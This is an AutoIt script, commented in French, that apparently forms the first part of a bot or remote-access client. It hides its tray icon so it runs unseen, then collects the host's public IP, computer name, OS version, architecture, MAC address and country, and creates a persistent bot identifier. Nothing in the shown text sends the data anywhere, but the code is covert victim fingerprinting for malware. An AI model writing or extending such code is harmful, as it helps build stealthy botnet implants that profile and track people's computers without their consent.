#include <MsgBoxConstants.au3>
#include <WinAPI.au3>
#include "_users_mac.au3"
#include "_users_localisation.au3"
#include "_users_ip.au3"
#include "_bot_id.au3"

;Masquer l'icone autoit dans la barre de tâche pendant l'exécution 
#NoTrayIcon

; Récupération des donnés
Func GetSystemInfo()
    Local $sIPAddress = _GetPublicIP()
    Local $sComputerName = @ComputerName
    Local $sOSID = @OSVersion
	Local $sOSac = @OSArch
    Return $sIPAddress & "|" & $sComputerName & "|" & $sOSID & "|" & $sOSac
EndFunc

Local $sInfo = GetSystemInfo()
Local $aInfo = StringSplit($sInfo, "|")

; Variable des donnés
Local $sIPAddress = $aInfo[1]
Local $sComputerName = $aInfo[2]
Local $sOSID = $aInfo[3]
Local $sOSac = $aInfo[4]
Local $sMAC = _GetMACFromIP(_GetPrivateIP())
Local $sLocalisation = Localisation_country($sIPAddress)
Local $sBotID = GenerateOrRetrieveString()